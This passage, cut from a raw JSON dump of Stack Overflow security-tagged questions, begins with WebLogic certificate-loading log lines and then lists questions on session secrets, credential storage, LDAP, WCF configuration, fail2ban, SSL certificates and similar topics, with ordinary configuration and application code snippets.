IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090171&gt; &lt;Loading the    identity       certificate and private key stored under the alias DemoIdentity from the jks keystore file C:\\Oracle\\MIDDLE~1\\WLSERV~1.3\\server\\lib\\DemoIdentity.jks.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090169&gt; &lt;Loading trusted certificates from the jks keystore file C:\\Oracle\\MIDDLE~1\\WLSERV~1.3\\server\\lib\\DemoTrust.jks.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090169&gt; &lt;Loading trusted certificates from the jks keystore file C:\\PROGRA~1\\Java\\JDK16~1.0_3\\jre\\lib\\security\\cacerts.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=Entrust Root Certification Authority - G2,OU=(c) 2009 Entrust\\, Inc. - for authorized use only,OU=See www.entrust.net/legal-terms,O=Entrust\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=thawte Primary Root CA - G3,OU=(c) 2008 thawte\\, Inc. - For authorized use only,OU=Certification Services Division,O=thawte\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=T-TeleSec GlobalRoot Class 3,OU=T-Systems Trust Center,O=T-Systems Enterprise Services GmbH,C=DE\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=T-TeleSec GlobalRoot Class 2,OU=T-Systems Trust Center,O=T-Systems Enterprise Services GmbH,C=DE\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=GlobalSign,O=GlobalSign,OU=GlobalSign Root CA - R3\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"OU=Security Communication RootCA2,O=SECOM Trust Systems CO.\\,LTD.,C=JP\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=VeriSign Universal Root Certification Authority,OU=(c) 2008 VeriSign\\, Inc. - For authorized use only,OU=VeriSign Trust Network,O=VeriSign\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=KEYNECTIS ROOT CA,OU=ROOT,O=KEYNECTIS,C=FR\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=GeoTrust Primary Certification Authority - G3,OU=(c) 2008 GeoTrust Inc. - For authorized use only,O=GeoTrust Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=Entrust Root Certification Authority - G2,OU=(c) 2009 Entrust\\, Inc. - for authorized use only,OU=See www.entrust.net/legal-terms,O=Entrust\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=thawte Primary Root CA - G3,OU=(c) 2008 thawte\\, Inc. - For authorized use only,OU=Certification Services Division,O=thawte\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=T-TeleSec GlobalRoot Class 3,OU=T-Systems Trust Center,O=T-Systems Enterprise Services GmbH,C=DE\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=T-TeleSec GlobalRoot Class 2,OU=T-Systems Trust Center,O=T-Systems Enterprise Services GmbH,C=DE\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=GlobalSign,O=GlobalSign,OU=GlobalSign Root CA - R3\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"OU=Security Communication RootCA2,O=SECOM Trust Systems CO.\\,LTD.,C=JP\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=VeriSign Universal Root Certification Authority,OU=(c) 2008 VeriSign\\, Inc. - For authorized use only,OU=VeriSign Trust Network,O=VeriSign\\, Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=KEYNECTIS ROOT CA,OU=ROOT,O=KEYNECTIS,C=FR\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n&lt;Oct 31, 2012 2:44:02 PM IST&gt; &lt;Notice&gt; &lt;Security&gt; &lt;BEA-090898&gt; &lt;Ignoring the trusted CA certificate \"CN=GeoTrust Primary Certification Authority - G3,OU=(c) 2008 GeoTrust Inc. - For authorized use only,O=GeoTrust Inc.,C=US\". The loading of the trusted certificate list raised a certificate parsing exception PKIX: Unsupported OID in the AlgorithmIdentifier object: 1.2.840.113549.1.1.11.&gt; \n</code></pre>\n"},{"tags":["security","node.js","session","express","sha256"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13151140,"title":"express secret key length","body":"<p>Are there any recommendations for the length of the secret key used to cryptographically hash session data in connect/express? I see everything from 60+ character strings to the canonical 'keyboard cat'.</p>\n\n<p>For my immediate use case, I intend to use SSL for the entire site and the payoff for a brute-force attack is medium to low.</p>\n"},{"tags":["security","buffer-overflow","exploit"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":7,"score":-1,"question_id":13152195,"title":"Issues with Return To Libc in Fedora","body":"<p>So I have been tackling at this for a while I cannot seem to find what my issues is.  Just to point out, this is a HW question so I understand if you do not want to help or give me any specifics.  However, any insight will do.  I am trying to craft an retuntolibc exploit and I have found where the segmentation fault, system, and exit locations are.  I have also found where \"/bin/bash\" is.  On top of that, I have disabled ASLR and the stack protector.  However, when I go into GDB and get system or exit, I always get a 6 bytes address (Example: 0xffffff), so I have an idea as to why my returntolibc string is not working.  In the program, I am supposed to use existing code in memory, but here is where I am stuck and have no idea where to turn.  Does anyone have any thoughts?  Anyway, thanks for your time and I hope to hear from you soon.</p>\n"},{"tags":["php","javascript","mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13151587,"title":"Store connection credentials securely in javascript?","body":"<p>I'm trying to make a web chat app for a mincraft server useing <a href=\"https://github.com/alecgorge/jsonapi/wiki\" rel=\"nofollow\">this api</a>. The <a href=\"https://github.com/alecgorge/jsonapi/blob/master/sdk/js/test/test1.html\" rel=\"nofollow\">demo script</a> for what I want to do shows the conection info, in plain text, witch will be easyly visible from any clients computer. Is there any way I can store this securely while still having the same functionality? Preferably retrieved from mySQL with php.</p>\n"},{"tags":["c#","security","dsl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":84,"score":2,"question_id":12964790,"title":"Using C# as my DSL -- is this possible, if so, how?","body":"<p><strong>Is it possible to use C# as a DSL</strong> in which the C# source code is edited by the end user in a TextBox, compiled while the application is running, then called by the already-running application?</p>\n\n<p>I ask because in the next few months I will be needing to implement a simple math-crunching DSL (similar to somthing Rachel Lim blogged about at <a href=\"http://rachel53461.wordpress.com/2011/08/20/the-math-converter/\" rel=\"nofollow\">http://rachel53461.wordpress.com/2011/08/20/the-math-converter/</a>\nI am focused on the math-processing aspect of her code, not the XAML/Converter aspect).  I would lean against just reusing her code because I want to add if-statements and possibly other features.  If I can use C# itself, then I get all of the features without having to re-implement them.</p>\n\n<p>If it is possible to do this, <strong>what framework or namespace or class would I want to use to accomplish such?</strong></p>\n\n<p>Please note that one thing I would do with the C#-derived DSL is hard-code all necessary using header statements, then remove all using statements entered by the savvy user.  The purpose of this is to reduce the prospect of an end user trying to leverage my C#-like DSL into a full-fledged compiler against the wishes of their enterprise policy or without the knowledge of the site administrator.  <strong>Is my proposed managing of using statements an adequate defense against user mischief?</strong></p>\n\n<p>Finally, if all of the answers up to this point are \"yes\", then <strong>what are the drawbacks of this approach, especially drawbacks of introducing a security vulnerability?</strong></p>\n\n<p>Paul</p>\n"},{"tags":["asp.net-mvc","security","authorization"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":198,"score":2,"question_id":8222258,"title":"How do you restrict certain HTML elements to certain roles using ASP.NET MVC?","body":"<p>I'm looking for the standard practice in specifying that a certain HTML element, like a \"Create user\" button should only be displayed when the user is logged-in and belongs to the role \"Administrator.\"</p>\n\n<p>For example, using Spring MVC in Java, the Spring Security tag library has a control that does just that:</p>\n\n<pre><code>&lt;sec:authorize access=\"hasRole('ROLE_PRESIDENT')\"&gt;\n    &lt;input type=\"button\" value=\"Launch nuclear weapons\"/&gt;\n&lt;/sec:authorize&gt;\n</code></pre>\n\n<p>Whatever appears between the tags will only display when the user belongs to the role specified.</p>\n\n<p>Does ASP.NET MVC have such feature?</p>\n"},{"tags":["security","encryption","login","password-encryption"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13144713,"title":"How to login and encrypt data with the same password/key","body":"<p>I've made a \"vault\" web app in PHP for storing passwords, credit card numbers, etc. It's mostly just for myself, but I'm practicing building it with multiple users in mind. I use two way encryption to secure the data, and want the user to login using their key (vs both a password to login AND a key for their data.)</p>\n\n<p>I initially stored the username in plaintext, and the key/password one way encrypted with a salt. My first concern is that if someone had access to the SQL data, they'd probably have access to my code (my salt and encryption method) making shorter work of revealing the password, then being able to access the two way encrypted data with it.</p>\n\n<p>I also didn't like the username sitting there in plaintext...that's half the login info right there.</p>\n\n<p>Basically, I'm worried about the login giving away extra info about the encrypted data itself.</p>\n\n<p><strong>What is the best practice for logging in, and two way encrypting data with the same password/key?</strong></p>\n\n<p>...and does anyone know where can I learn more about this specific concept?</p>\n"},{"tags":["c#","security","hash"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":502,"score":5,"question_id":2517128,"title":"Is it possible to create a file with a given size and MD5 hash?","body":"<p>Of course I know is possible to create a file with a certain size and how to do it. But is it possible to create a file with a certain size and also a certain MD5 fingerprint?</p>\n"},{"tags":["security","scripting","adobe-reader"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12353438,"title":"How to globally disable Adobe scripting security warnings?","body":"<h2>Questions</h2>\n\n<ul>\n<li>How can I permanently disable the scripting warning and allow scripting in Adobe Reader X? </li>\n<li>Is this a policy setting, a local setting, or impossible?</li>\n</ul>\n\n<h2>Background / Problem</h2>\n\n<p>At our enterprise, we make use of Adobe Reader X (though the reason still escapes me).</p>\n\n<p>One of our enterprise applications allows the viewing and markup of PDFs.</p>\n\n<p>However, the Adobe scripting warning pops up for some of these PDFs, and because of the way the application displays it, the user cannot allow scripting, rendering some of the app's pdf markup operations useless.</p>\n\n<p><strong>Note</strong>: We are aware of the security risks this entails and have examined our environment and processes to determine that this is a reasonable course of action in this scenario.</p>\n\n<h2>Goal</h2>\n\n<ul>\n<li>Remove the warning when opening a PDF in select cases so that our application may use PDFs properly.</li>\n</ul>\n"},{"tags":["java","security","active-directory","ldap","ntlm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":123,"score":0,"question_id":11932031,"title":"Connecting to LDAP (Active Directory) with NTLM","body":"<p>Currently, I'm using user and password as the connection credentials to ldap (in order to search on this AD).</p>\n\n<p>My code looks like:</p>\n\n<pre><code>env = new Hashtable();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, ...);\nenv.put(Context.SECURITY_AUTHENTICATION, \"simple\");\nenv.put(Context.SECURITY_PRINCIPAL, ...);\nenv.put(Context.SECURITY_CREDENTIALS, ...);\nenv.put(\"com.sun.jndi.ldap.connect.timeout\", ...);\n\ntry {\n  ctx = new InitialLdapContext(env, null);\n}\ncatch (NamingException e) {\n    System.out.println(\"error\")\n}\n</code></pre>\n\n<p>I want to change this code, so it will not use user+password as the credentials against the LDAP. I want it to authenticate using NTLM.</p>\n\n<p>How can I do it? Can you provide an example?</p>\n"},{"tags":["security","web-security"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":618,"score":2,"question_id":4782829,"title":"Website security thesis- what topics to cover?","body":"<p>What topics should be covered in a thesis about website security?</p>\n\n<p>thanks!</p>\n"},{"tags":["security","networking","mongodb","amazon-ec2"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":677,"score":2,"question_id":7962974,"title":"Spreading MongoDB across EC2 regions","body":"<p>I want to distribute a sharded/replicated MongoDB setup across multiple of Amazon's EC2 regions. Is this traffic already encrypted by MongoDB or can I optionally set this up? Or does Amazon offer a special VPN-like connection between its data centers?</p>\n"},{"tags":["security",".net-4.0","fxcop","linkdemand"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13143049,"title":"Is calling process.start a security risk from an azure worker role?","body":"<p>We have a worker role in Azure which uses <code>Process.Start</code> to kick off a background process (which hosts a native application we need to run)</p>\n\n<p>FxCop gives me a whole load of <a href=\"http://msdn.microsoft.com/en-us/library/ms182303.aspx\" rel=\"nofollow\">CA2122</a> errors due to a link demand.  When I tried to add this attribute:</p>\n\n<pre><code>[PermissionSet(SecurityAction.LinkDemand, Name = \"FullTrust\")]\n</code></pre>\n\n<p>I then started to get <a href=\"http://msdn.microsoft.com/en-us/library/dd997569.aspx\" rel=\"nofollow\">CA2135</a> instead, the solution to which seems to be to add the SecurityCritical attribute instead.</p>\n\n<p>But then I get the CA2122 again.</p>\n\n<p>Are either of these things an issue?  Under what circumstances could they be and how can I be sure that I'm not introducing a security problem?</p>\n"},{"tags":["sql-server","security","sql-server-2008","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2907,"score":3,"question_id":6212598,"title":"Server Role to execute SQL Server Agent Jobs in SQL SERVER 2008","body":"<p>The users from other departments ask me to grant them to execute Schedule Jobs / SSIS in SQL Server Agent.  At present, they cannot see SQL Server Agent tree in their ManagmentStudio.  I think, it's because they don't have the rights to execute them.</p>\n\n<p>So, I would like to know which server role should I give to them.  I only want to give them minimum privileges.  When I check the existing roles in my server, I could only see the following server roles</p>\n\n<ol>\n<li>bulkadmin</li>\n<li>dbcreator</li>\n<li>diskadmin</li>\n<li>processadmin</li>\n<li>public</li>\n<li>securityadmin</li>\n<li>serveradmin</li>\n<li>setupadmin</li>\n<li>sysadmin</li>\n</ol>\n\n<p>Please advise me.</p>\n"},{"tags":["php","security","variables","pass"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":69,"score":3,"question_id":13142054,"title":"Most secure way to pass variables between two pages with PHP","body":"<p>I need a way to pass a variable between two page in a secure way.</p>\n\n<p>I know that I can use POST / GET / Cookie / Session or hidden fields but I think none of these ways aren't secure enough because :</p>\n\n<p>get can be seen in the url<br>\ncookies is a client side so it can be change from client<br>\nsession can confront Session ID hijacking and ...<br></p>\n\n<p>Now I want to know is there another ways better than these ways and if there isn't witch of these is the best way to pass variables in secure manner;</p>\n"},{"tags":["entity-framework","security","breeze"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13091760,"title":"Data Security using Entity Framework","body":"<p>What options/solutions are there for securing data using Entity Framework?</p>\n\n<p>I do not talk about forms login and such here, just assume that the users are authenticated or not.</p>\n\n<p>To illustrate, i attached one of my web api controllers and i wonder if this is the way to do it. The reason why i ask is that i wonder if there are easier ways to do this than writing all this logic to what data to expose in all my controllers.</p>\n\n<p>Also, when looking into a system like breezejs and odata where i can add $expand=TrafficImages to my queries, i would not want users to be able to get my hole database. </p>\n\n<p>So to summarize, what ways are there to securing the data exposed such the users cant download sensible data.</p>\n\n<pre><code>[AllowAnonymous]\npublic object GetTheoryTests()\n{\n    var identity = ((ClaimsIdentity)((ClaimsPrincipal)HttpContext.Current.User).Identity);\n    //if (HttpContext.Current.User.Identity.IsAuthenticated)\n\n\n   if (!identity.IsAuthenticated)\n     return db.TheoryTests.Include(t=&gt;t.TrafficImages).Where(t=&gt;t.PublicAvalible)\n            .Select(t =&gt; new { Id = t.Id, Title = t.Title, Images = t.TrafficImages }).AsEnumerable();\n\n   if (User.IsInRole(\"WebAdmins\"))\n       return db.TheoryTests.AsEnumerable();\n\n    var key = identity.GetProvider();\n\n    var member = db.Members.Include(m=&gt;m.PayedTheoryTests).SingleOrDefault(m=&gt;m.Identities.Any(\n        i=&gt;i.identityprovider == key.provider &amp;&amp;\n        i.nameidentifier == key.id));\n        if(member!=null)\n            return db.TheoryTests.Include(t =&gt; t.TrafficImages).Where(t =&gt; t.PublicAvalible).Select(t =&gt; new { Id = t.Id, Title = t.Title, Images = t.TrafficImages }).AsEnumerable();\n        else\n            return db.TheoryTests.Include(t =&gt; t.TrafficImages).Where(t =&gt; t.PublicAvalible)\n                .Union(member.PayedTheoryTests).Select(t =&gt; new { Id = t.Id, Title = t.Title, Images = t.TrafficImages }).AsEnumerable();\n\n\n\n}\n</code></pre>\n\n<p>When thinking about it, what i miss is something like a viewmodel untop of my database depending on the state of the user. Would it be a solution to create two entity frameworks ontop of the same database, one for limited data display and one for more advanced operations?</p>\n"},{"tags":["apache","security","ubuntu-12.04"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13141906,"title":"fail2ban-apache not blocking IP","body":"<p>I'm trying to configure fail2ban, I attempted to log into my web server numerous times to trigger the rule and looking at my iptable it seems to have worked:</p>\n\n<pre><code>Chain fail2ban-apache (1 references)\ntarget     prot opt source               destination\nDROP       all  --  192.168.1.70         0.0.0.0/0\nRETURN     all  --  0.0.0.0/0            0.0.0.0/0\n</code></pre>\n\n<p>But, if i try and access the apache server from .70 I still can!</p>\n\n<p>Any ideas?</p>\n"},{"tags":["java","security","keystore","digital-certificate"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12201672,"title":"java keystore file limitations","body":"<p>I created a keystore file for my PFX certificates (<a href=\"http://en.wikipedia.org/wiki/PKCS12\" rel=\"nofollow\">PKCS#12</a>), but I need to know how many keys can be stored in a keystore file (JKS).</p>\n\n<p>I'm currently loading the certificates as follows:</p>\n\n<pre><code>KeyStore oStore = KeyStore.getInstance(\"PKCS12\");\noStore.load(new FileInputStream(AppConfig.get(AppConfig.SRC_KEY)), \n    \"SECRET\".toCharArray());\n...\noStore.setKeyEntry(idAlias, privateKey, pwd.toCharArray(), chain);\noStore.store(new FileOutputStream(AppConfig.get(AppConfig.SRC_KEY)),  \n    \"SECRET\".toCharArray());\n</code></pre>\n\n<p>Is there a limit to the number of keys and certificates I can store in this keystore?</p>\n"},{"tags":["security","postgresql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13138350,"title":"Postgresql database objects security","body":"<p>I am developing an application which will use a postgreSQL database backend. I want to prevent the user from seeing some of the db objects - stored procs implementation in particular etc.</p>\n\n<p>The \"obvious\" (but perhaps wrong) way is to GRANT CRUD access to the database to a specific user who will have an encrypted uname/pwd?</p>\n\n<p>Is there another way of doing this?.</p>\n\n<p>Note: My target audience are largely non-programmers, so I don't need anything that is \"unbreakable\" (assuming such a thing existed).</p>\n"},{"tags":["android","security","su"],"answer_count":1,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":63,"score":5,"question_id":13138867,"title":"How does Android SuperUser app detect that an app requests root?","body":"<p>I'm writing an app that will use <code>su</code> to execute some commands in the linux kernel. I was wondering how SuperUser figures out that the application is asking for root privileges ? Also, are there any known ways (through obfuscation) in which this check can be bypassed ?</p>\n\n<p>In other words: \nHow does Android/(SuperUser) know that an app requires root privileges despite the fact that there are no permissions explicitly requested in the android manifest file.</p>\n\n<p>I'm asking this question from a security standpoint. I want to know the details of how this works in order to be sure that a malicious app cannot bypass SuperUser.</p>\n"},{"tags":["security","browser","filter","liferay","hack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13139915,"title":"Displaying filters in Browser poses Security threat?","body":"<p>Am using <code>Liferay portal 6.0</code>. Am using <code>Header Filter (com.liferay.portal.servlet.filters.header.HeaderFilter)</code>. This <code>filter</code> am using in <code>web.xml</code> of my Portlets. End user is able to see this filter in Browser. Below attached image gives all details of this <code>filter</code> and URL pattern. Using this information can any Security threat be posed to my application? How can I hide these details in my Browser response?<img src=\"http://i.stack.imgur.com/9sXo8.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["wcf","security","iis7","active-directory","net.tcp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13134795,"title":"WCF service with net.tcp binding (hosted on IIS 7) doesn't work under domain user (for app pool)","body":"<p>I have a WCF service with the following configuration</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n&lt;system.web&gt;\n   &lt;compilation debug=\"true\" /&gt;\n&lt;/system.web&gt;\n\n&lt;system.serviceModel&gt;\n&lt;bindings&gt;\n  &lt;netTcpBinding&gt;\n    &lt;binding name=\"CommonWindowsBinding\" maxReceivedMessageSize=\"40000000\"&gt;\n      &lt;security mode=\"TransportWithMessageCredential\" &gt;\n        &lt;transport clientCredentialType=\"None\"/&gt;\n        &lt;message clientCredentialType=\"Windows\" /&gt;\n      &lt;/security&gt;\n    &lt;/binding&gt;\n  &lt;/netTcpBinding&gt;\n&lt;/bindings&gt;\n\n&lt;serviceHostingEnvironment multipleSiteBindingsEnabled=\"true\" /&gt;\n\n&lt;services&gt;\n  &lt;service behaviorConfiguration=\"CommonBehavior\" name=\"Megatec.MasterTourService.AdminService\"&gt;\n    &lt;endpoint address=\"Windows\" binding=\"netTcpBinding\" bindingConfiguration=\"CommonWindowsBinding\" name=\"Megatec.MasterTourService.Contracts.IAdminServiceWindows\" contract=\"Megatec.MasterTourService.Contracts.IAdminService\"&gt;\n      &lt;identity&gt;\n        &lt;dns value=\"WCFServer\" /&gt;\n      &lt;/identity&gt;\n    &lt;/endpoint&gt;\n&lt;/services&gt;\n\n&lt;behaviors&gt;\n  &lt;serviceBehaviors&gt;\n    &lt;behavior name=\"CommonBehavior\"&gt;\n      &lt;dataContractSerializer maxItemsInObjectGraph=\"10000000\" /&gt;\n      &lt;serviceMetadata httpGetEnabled=\"true\" policyVersion=\"Policy15\" /&gt;\n      &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n      &lt;serviceAuthorization impersonateCallerForAllOperations=\"true\" /&gt;\n      &lt;serviceCredentials&gt;\n\n        &lt;clientCertificate&gt;\n          &lt;authentication certificateValidationMode=\"PeerTrust\" /&gt;\n        &lt;/clientCertificate&gt;\n\n        &lt;serviceCertificate findValue=\"WCFServer\" storeLocation=\"LocalMachine\" storeName=\"My\" x509FindType=\"FindBySubjectName\" /&gt;\n\n        &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\" customUserNamePasswordValidatorType=\"Megatec.MasterTourService.Security.CustomUserNameValidator, Megatec.MasterTourService.Security\" /&gt;\n        &lt;/serviceCredentials&gt;\n       &lt;/behavior&gt;\n     &lt;/serviceBehaviors&gt;\n    &lt;/behaviors&gt;\n  &lt;/system.serviceModel&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>Code</p>\n\n<pre><code>public class AdminService : BaseAuthService, IAdminService\n{\n    [OperationBehavior(Impersonation = ImpersonationOption.Required)]\n    public bool HasRole(string roleName)\n    {\n        //work with database\n    }\n}\n</code></pre>\n\n<p>I host this service on IIS 7, for application pool I set domain user (Master\\MyLogin). I need domain user for delegation (according to <a href=\"http://msdn.microsoft.com/en-us/library/ff650896.aspx\" rel=\"nofollow\">step 4</a>).</p>\n\n<p>It works fine, when I consume service from a local client (the same computer, under Master\\MyLogin or some other domain user). But when I tried to consume service from the other network computer, it failed. Everything works fine with ApplicationPoolIdentity.</p>\n\n<p>Master\\MyLogin is a administrator on the computer with service (but he isn't a domain admin).</p>\n\n<p>Maybe, there is rights, which should be granted to Master\\MyLogin?</p>\n\n<p><strong>Update</strong>. Client exception.</p>\n\n<p>At first, there was SecurityNegotiationException. Next, I've added section </p>\n\n<pre><code>&lt;identity&gt;\n    &lt;userPrincipalName value=\"myLogin@Mydomain\" /&gt;\n&lt;/identity&gt;\n</code></pre>\n\n<p>New exception was MessageSecurityException. </p>\n\n<p><code>The identity check failed for the outgoing message. The expected identity is \"identity(http://schemas.xmlsoap.org/ws/2005/05/identity/right/possessproperty: http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn)\" for the 'net.tcp://dev4-10:5012/IISTest/AdminService.svc/Windows' target endpoint.</code></p>\n\n<p>How should I configure <code>&lt;identity&gt;</code> for client and service?</p>\n"},{"tags":["security","encryption","ssl-certificate","aes","certificate-authority"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13136675,"title":"Why do many SSL Certificate vendors advertise a 128/256Bit encryption support?","body":"<p>I was wondering why vendors of SSL-Certificates always say, that their certificate supports 128/256-Bit AES-Encryption?<br>\nI mean, the symmetric encryption is something that happens between a webbrowser and a webserver - and has nothing to do with the SSL-Certificate itself (as also no information about symmetric encryption is saved in the certificate...).</p>\n\n<p>Can anyone explain to me, why these companies advertise with this statement?<br>\nIs it just good marketing? Or is there a real functional reason behind?</p>\n\n<p>Examples see here:<br>\n<a href=\"http://www.startssl.com/?app=39\" rel=\"nofollow\">http://www.startssl.com/?app=39</a><br>\n<a href=\"https://www.symantec.com/theme.jsp?themeid=verisign-ssl-certificates&amp;inid=vrsn_symc_ssl_Buy\" 